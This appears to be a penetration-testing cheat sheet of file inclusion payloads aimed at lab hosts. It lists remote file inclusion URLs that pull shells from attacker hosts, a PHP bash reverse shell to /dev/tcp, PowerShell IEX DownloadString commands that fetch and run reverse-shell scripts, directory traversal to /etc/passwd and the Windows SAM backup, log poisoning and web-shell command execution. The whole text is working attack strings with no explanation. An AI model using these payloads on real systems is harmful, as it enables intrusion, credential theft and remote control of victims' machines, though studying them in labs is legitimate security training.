File Inclusions

**// REMOTE FILE INCLUSION (RFI)**

echo "<?php echo shell_exec("bash -i >& /dev/tcp/192.168.119.246/443 0>&1");?>" > evil.txt
http:///action=/inc/config.php?basePath=http:///shell.php%00
http://10.11.1.8/internal/advanced_comment_system/index.php?ACS_path=http://:/test.txt%00
http://10.11.1.35/section.php?page=http://:/evil.txt&c=
http://10.11.1.50:9505/?search={.exec|C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://:/shell.bat').}
http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/111111111/slogin_lib.inc.php?slogin_path=http://:/shell.txt?
http://192.168.131.10/menu.php?file=http:\:\evil.txt?cmd=powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http:\:\reverse-shell.bat'))"
http://192.168.131.10/menu.php?file=data:text/plain,"&cmd=powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://:/revshell.bat'))"

**// LOCAL FILE INCLUSION (LFI) & DIRECTORY TRAVERSAL**
http:///browse.php?p=source&file=../../../etc/passwd
wget http:///..%5C..%5C..%5CWindows%5CSystem32%5Cconfig%5CRegback%5CSAM.OLD
http://192.168.131.10/menu.php?file=c:\xampp\apache\logs\access.log&cmd=powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http:\:\reverse-shell.bat'))"
https://10.2.2.86/browse.php?p=source&file=C:\xampp\apache\logs\access.log
http://10.11.1.35/section.php?page=/etc/passwd
http://10.11.1.73:8080/PHP/fileManager/fileManager/collectives/DG0/NewAccess/shell2.php?cmd=powershell -c .\shell.exe
http://10.11.1.116/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
http://10.11.1.116/administrator/alerts/alertConfigField.php?urlConfig=/usr/local/databases/hack.php
http://10.11.1.141:10000/unauthenticated/../../../../../etc/passwd
curl -l http://10.11.1.11/uploads/shell.php?cmd=whoami